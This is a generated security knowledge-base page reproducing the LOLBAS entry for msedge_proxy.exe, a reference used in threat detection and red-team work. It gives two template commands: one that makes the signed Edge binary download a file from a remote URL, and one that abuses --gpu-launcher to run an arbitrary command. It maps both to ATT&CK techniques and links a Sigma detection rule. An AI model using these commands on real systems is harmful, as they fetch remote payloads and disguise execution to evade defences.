---
title: "msedge_proxy.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OSBinaries/msedge_proxy.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/msedge_proxy.yml"
build_date: "2026-04-27 19:14:21"
category: "OSBinaries"
aliases:
  - "msedge_proxy.exe"
functions:
  - "Download"
  - "Execute"
attack_technique_ids:
  - "T1105"
  - "T1218.015"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Microsoft Edge Browser

## Paths

- `C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe`

## Commands

### 1. Download

msedge_proxy will download malicious file.

```cmd
C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe {REMOTEURL:.zip}
```

- Use Case: Download file from the internet
- Privileges: User
- Operating System: Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105: Ingress Tool Transfer]]

### 2. Execute

msedge_proxy.exe will execute file in the background

```cmd
C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe --disable-gpu-sandbox --gpu-launcher="{CMD} &&"
```

- Use Case: Executes a process under a trusted Microsoft signed binary
- Privileges: User
- Operating System: Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution#^t1218015-electron-applications|T1218.015: Electron Applications]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/e1a713d264ac072bb76b5c4e5f41315a015d3f41/rules/windows/process_creation/proc_creation_win_susp_electron_execution_proxy.yml

## Acknowledgements

- {'Person': 'Mert Daş', 'Handle': '@merterpreter'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/msedge_proxy.yml)
